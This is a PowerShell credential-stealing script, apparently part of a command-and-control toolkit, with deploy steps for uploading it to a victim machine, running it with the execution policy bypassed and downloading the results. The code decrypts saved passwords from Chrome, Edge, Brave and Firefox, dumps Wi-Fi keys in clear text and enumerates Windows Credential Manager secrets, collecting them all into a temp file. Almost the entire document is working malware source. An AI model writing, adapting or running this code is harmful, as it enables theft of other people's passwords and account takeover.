# cred_steal.ps1 — Chrome / Edge / Firefox credential decryptor
# Run in the TARGET USER'S session (NOT as SYSTEM) so DPAPI works correctly.
# Output: C:\Windows\Temp\creds.txt
#
# Deploy:
#   upload /home/kali/turon-c2-src/bypass/cred_steal.ps1 C:\Windows\Temp\cred_steal.ps1
#   powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\cred_steal.ps1
#   download C:\Windows\Temp\creds.txt

Add-Type -AssemblyName System.Security

$out = "C:\Windows\Temp\creds.txt"
"[+] Credential dump $(Get-Date)" | Out-File $out

# ── Helpers ──────────────────────────────────────────────────────────────────

function Unprotect-DPAPI($bytes) {
    try {
        return [System.Security.Cryptography.ProtectedData]::Unprotect(
            $bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    } catch { return $null }
}

function AES-GCM-Decrypt($key, $nonce, $ct) {
    # Pure .NET AES-GCM (available on .NET 6+ / Win10+ via Add-Type)
    # Falls back to native via PInvoke if not available
    try {
        $ag = [System.Security.Cryptography.AesGcm]::new([byte[]]$key)
        $tag = $ct[-16..-1]
        $data = $ct[0..($ct.Length-17)]
        $plain = New-Object byte[] $data.Length
        $ag.Decrypt([byte[]]$nonce, [byte[]]$data, [byte[]]$tag, $plain)
        $ag.Dispose()
        return $plain
    } catch { return $null }
}

function Read-SQLite-Logins($db_path) {
    # Copy to temp (Chrome locks the original)
    $tmp = [IO.Path]::GetTempFileName() + ".db"
    try { [IO.File]::Copy($db_path, $tmp, $true) } catch { return @() }

    $rows = @()
    try {
        Add-Type -AssemblyName System.Data
        $conn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$tmp;Version=3;Read Only=True;"
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url,username_value,password_value FROM logins"
        $rdr = $cmd.ExecuteReader()
        while ($rdr.Read()) {
            $rows += [pscustomobject]@{
                URL  = $rdr.GetString(0)
                User = $rdr.GetString(1)
                Blob = $rdr.GetValue(2) -as [byte[]]
            }
        }
        $rdr.Close(); $conn.Close()
    } catch {
        # Fallback: read raw SQLite pages for the logins table using BinaryReader
        # SQLite page size at offset 16 (2 bytes big-endian), B-tree pages, simple scan
        $rows = Read-SQLite-Raw $tmp
    }
    Remove-Item $tmp -Force -EA 0
    return $rows
}

function Read-SQLite-Raw($path) {
    # Minimal raw SQLite text-cell scanner — no dependency on System.Data.SQLite
    # Reads all leaf pages and extracts string cells containing '@' or 'http'
    $rows = @()
    try {
        $data = [IO.File]::ReadAllBytes($path)
        $pgSz = ([int]$data[16] -shl 8) -bor $data[17]
        if ($pgSz -eq 0 -or $pgSz -eq 1) { $pgSz = 65536 }
        $numPg = [Math]::Floor($data.Length / $pgSz)

        # Decode varint
        $decVi = {
            param($buf,$pos)
            $v=0; $s=0
            for ($i=0;$i-lt9;$i++) {
                $b=$buf[$pos+$i]; $v = $v -bor (($b -band 0x7F) -shl $s); $s+=7
                if (-not($b -band 0x80)) { return @($v,$pos+$i+1) }
            }
            return @($v,$pos+9)
        }

        for ($pg=0; $pg -lt $numPg; $pg++) {
            $base = $pg * $pgSz
            if ($base+1 -ge $data.Length) { continue }
            $pgType = $data[$base]          # 0x0D = leaf table
            if ($pgType -ne 0x0D) { continue }
            $numCells = ([int]$data[$base+3] -shl 8) -bor $data[$base+4]
            $ofs = if ($pg -eq 0) { 100 } else { 0 }
            for ($c=0; $c -lt $numCells; $c++) {
                $pOff = $ofs + 8 + $c*2
                if ($pOff+1 -ge $pgSz) { continue }
                $cOff = $base + (([int]$data[$base+$pOff] -shl 8) -bor $data[$base+$pOff+1])
                if ($cOff -ge $data.Length) { continue }
                # parse payload length varint
                $r = & $decVi $data $cOff
                $payLen = $r[0]; $p = $r[1]
                # rowid varint
                $r2 = & $decVi $data $p; $p = $r2[1]
                # header length varint
                $r3 = & $decVi $data $p; $hLen=$r3[0]; $hEnd=$p+$hLen; $p=$r3[1]
                # read serial types
                $types=@()
                while ($p -lt $hEnd) {
                    $r4 = & $decVi $data $p; $types += $r4[0]; $p=$r4[1]
                }
                # extract text cells (serial type >= 13, odd = text)
                $cells=@{}; $fi=0
                foreach ($t in $types) {
                    $sz = if ($t -ge 13 -and ($t%2 -eq 1)) { ($t-13)/2 }
                           elseif ($t -ge 12 -and ($t%2 -eq 0)) { ($t-12)/2 }
                           elseif ($t -eq 1) {1} elseif ($t-eq 2){2}
                           elseif ($t -eq 3){3} elseif ($t -eq 4){4}
                           elseif ($t -eq 5){6} elseif ($t -eq 6){8}
                           elseif ($t -eq 7){8} else {0}
                    if ($t -ge 13 -and ($t%2 -eq 1)) {
                        try { $cells[$fi] = [Text.Encoding]::UTF8.GetString($data,$p,[int]$sz) } catch {}
                    } elseif ($t -ge 12 -and ($t%2 -eq 0) -and $sz -gt 0) {
                        # blob (password_value)
                        $blob = New-Object byte[] ([int]$sz)
                        [Array]::Copy($data,$p,$blob,0,[int]$sz)
                        $cells[$fi] = $blob
                    }
                    $p += [int]$sz; $fi++
                }
                if ($cells.Count -ge 3) {
                    $rows += [pscustomobject]@{
                        URL  = "$($cells[0])"; User = "$($cells[1])"; Blob = $cells[2]
                    }
                }
            }
        }
    } catch {}
    return $rows
}

function Dump-Chromium($name, $user_dir) {
    $ls = "$user_dir\Local State"
    if (-not (Test-Path $ls)) { return }

    # Get AES key from Local State
    try {
        $lsJson  = Get-Content $ls -Raw | ConvertFrom-Json
        $encKey64 = $lsJson.os_crypt.encrypted_key
        $encKey   = [Convert]::FromBase64String($encKey64)
        # Strip "DPAPI" prefix (5 bytes)
        $dpBlob   = $encKey[5..($encKey.Length-1)]
        $aesKey   = Unprotect-DPAPI $dpBlob
    } catch { return }

    if (-not $aesKey) {
        "  [!] $name : DPAPI decrypt failed (wrong user context?)" | Out-File $out -Append
        return
    }

    # Enumerate profiles
    Get-ChildItem $user_dir -Directory -Force -EA 0 | ForEach-Object {
        $db = "$($_.FullName)\Login Data"
        if (-not (Test-Path $db)) { return }
        $rows = Read-SQLite-Logins $db
        foreach ($r in $rows) {
            if (-not $r.Blob -or $r.Blob.Length -lt 19) { continue }
            if ($r.Blob[0] -eq [byte]0x76 -and $r.Blob[1] -eq [byte]0x31 -and $r.Blob[2] -eq [byte]0x30) {
                # v10 format: [3:nonce(12)] [15:ciphertext+tag]
                $nonce  = $r.Blob[3..14]
                $ctFull = $r.Blob[15..($r.Blob.Length-1)]
                $plain  = AES-GCM-Decrypt $aesKey $nonce $ctFull
                $pwd    = if ($plain) { [Text.Encoding]::UTF8.GetString($plain) } else { "<decrypt_failed>" }
            } else {
                # Legacy DPAPI-only blob
                $dp  = Unprotect-DPAPI $r.Blob
                $pwd = if ($dp) { [Text.Encoding]::UTF8.GetString($dp) } else { "<dpapi_failed>" }
            }
            "[$name] $($r.URL) | $($r.User) | $pwd" | Out-File $out -Append
        }
    }
}

# ── Firefox ──────────────────────────────────────────────────────────────────

function Decrypt-FF-Field($encStr, $key, $iv) {
    try {
        $ct  = [Convert]::FromBase64String($encStr)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key; $aes.IV = $iv; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
        $dec = $aes.CreateDecryptor()
        $plain = $dec.TransformFinalBlock($ct, 0, $ct.Length)
        $aes.Dispose()
        return [Text.Encoding]::UTF8.GetString($plain)
    } catch { return $null }
}

function Dump-Firefox($profile_path) {
    $key4   = "$profile_path\key4.db"
    $logins = "$profile_path\logins.json"
    if (-not (Test-Path $key4) -or -not (Test-Path $logins)) { return }

    # Read logins.json
    try {
        $lj = Get-Content $logins -Raw | ConvertFrom-Json
    } catch { return }

    # key4.db: query nssPrivate table for key material
    # Without master password the globalSalt+password check uses empty string
    # Python/pypykatz handles this offline; here we do a best-effort approach
    # by trying to extract via NSS via C# PInvoke if nss3.dll is on system
    $nss3 = Get-ChildItem "C:\Program Files\Mozilla Firefox\nss3.dll" -EA 0 |
            Select-Object -First 1
    if (-not $nss3) {
        "[FF] $profile_path : nss3.dll not found, copy files and decrypt offline with firepwd" | Out-File $out -Append
        foreach ($l in $lj.logins) {
            "[FF-raw] $($l.hostname) | encUser=$($l.encryptedUsername) | encPass=$($l.encryptedPassword)" | Out-File $out -Append
        }
        return
    }

    # Load NSS and decrypt (requires Firefox installed)
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class NSSHelper {
    [DllImport("nss3.dll", EntryPoint="NSS_Init", CharSet=CharSet.Ansi)]
    public static extern int NSS_Init(string dir);
    [DllImport("nss3.dll", EntryPoint="NSS_Shutdown")]
    public static extern int NSS_Shutdown();
    [StructLayout(LayoutKind.Sequential)] public struct SECItem { public int type; public IntPtr data; public int len; }
    [DllImport("nss3.dll", EntryPoint="PK11SDR_Decrypt")]
    public static extern int PK11SDR_Decrypt(ref SECItem inp, ref SECItem outp, IntPtr cx);
    public static string Decrypt(byte[] enc, string profileDir) {
        NSS_Init(profileDir);
        SECItem inp = new SECItem { type=0, data=Marshal.AllocHGlobal(enc.Length), len=enc.Length };
        Marshal.Copy(enc, 0, inp.data, enc.Length);
        SECItem outp = new SECItem();
        if (PK11SDR_Decrypt(ref inp, ref outp, IntPtr.Zero) == 0 && outp.len > 0) {
            byte[] r = new byte[outp.len];
            Marshal.Copy(outp.data, r, 0, outp.len);
            NSS_Shutdown();
            return Encoding.UTF8.GetString(r);
        }
        NSS_Shutdown();
        return null;
    }
}
"@ -ReferencedAssemblies @() -EA 0

    foreach ($l in $lj.logins) {
        try {
            $uEnc = [Convert]::FromBase64String($l.encryptedUsername)
            $pEnc = [Convert]::FromBase64String($l.encryptedPassword)
            $u    = [NSSHelper]::Decrypt($uEnc, $profile_path)
            $p    = [NSSHelper]::Decrypt($pEnc, $profile_path)
            if ($u -or $p) { "[FF] $($l.hostname) | $u | $p" | Out-File $out -Append }
        } catch {}
    }
}

# ── Wi-Fi ─────────────────────────────────────────────────────────────────────

"" | Out-File $out -Append
"[WiFi]" | Out-File $out -Append
netsh wlan show profiles 2>$null | Select-String ':\s+(.+)$' | ForEach-Object {
    $ssid = $_.Matches[0].Groups[1].Value.Trim()
    $info = netsh wlan show profile name="`"$ssid`"" key=clear 2>$null
    if ($info -match 'Key Content\s+:\s+(.+)') {
        "[WiFi] $ssid : $($Matches[1].Trim())" | Out-File $out -Append
    }
}

# ── Windows Credential Manager ────────────────────────────────────────────────

"" | Out-File $out -Append
"[CredMan]" | Out-File $out -Append
try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class CredMan {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct CREDENTIAL {
        public int Flags; public int Type; public string TargetName;
        public string Comment; public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public int CredentialBlobSize; public IntPtr CredentialBlob;
        public int Persist; public int AttributeCount; public IntPtr Attributes;
        public string TargetAlias; public string UserName;
    }
    [DllImport("advapi32.dll", EntryPoint="CredEnumerateW", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr creds);
    [DllImport("advapi32.dll")] public static extern void CredFree(IntPtr buf);
    public static void Dump(System.IO.StreamWriter sw) {
        int cnt; IntPtr pc;
        if (!CredEnumerate(null, 0x1, out cnt, out pc)) return;
        for (int i=0;i<cnt;i++) {
            IntPtr p = Marshal.ReadIntPtr(pc, i*IntPtr.Size);
            var c = (CREDENTIAL)Marshal.PtrToStructure(p, typeof(CREDENTIAL));
            string pwd = "";
            if (c.CredentialBlobSize > 0)
                pwd = Encoding.Unicode.GetString(
                    System.Runtime.InteropServices.Marshal.ReadByte(c.CredentialBlob) == 0 ?
                    new byte[0] : GetBytes(c.CredentialBlob, c.CredentialBlobSize));
            sw.WriteLine("[CredMan] {0} | {1} | {2}", c.TargetName, c.UserName, pwd);
        }
        CredFree(pc);
    }
    static byte[] GetBytes(IntPtr p, int n) { byte[] b=new byte[n]; Marshal.Copy(p,b,0,n); return b; }
}
"@ -EA 0
    $sw = [IO.StreamWriter]::new($out, $true)
    [CredMan]::Dump($sw)
    $sw.Close()
} catch {}

# ── Main: enumerate users ─────────────────────────────────────────────────────

$users = Get-ChildItem C:\Users -Directory -Force -EA 0 |
    Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }

foreach ($u in $users) {
    "" | Out-File $out -Append
    "=== User: $($u.Name) ===" | Out-File $out -Append

    # Chrome
    Dump-Chromium "Chrome" "$($u.FullName)\AppData\Local\Google\Chrome\User Data"
    # Edge
    Dump-Chromium "Edge"   "$($u.FullName)\AppData\Local\Microsoft\Edge\User Data"
    # Brave
    Dump-Chromium "Brave"  "$($u.FullName)\AppData\Local\BraveSoftware\Brave-Browser\User Data"

    # Firefox
    Get-ChildItem "$($u.FullName)\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -Force -EA 0 | ForEach-Object {
        Dump-Firefox $_.FullName
    }
}

Write-Host "[+] Credentials written to $out"
Get-Content $out | Where-Object { $_ -notmatch '^\[' } | Measure-Object | % { Write-Host "[+] $($_.Count) entries" }
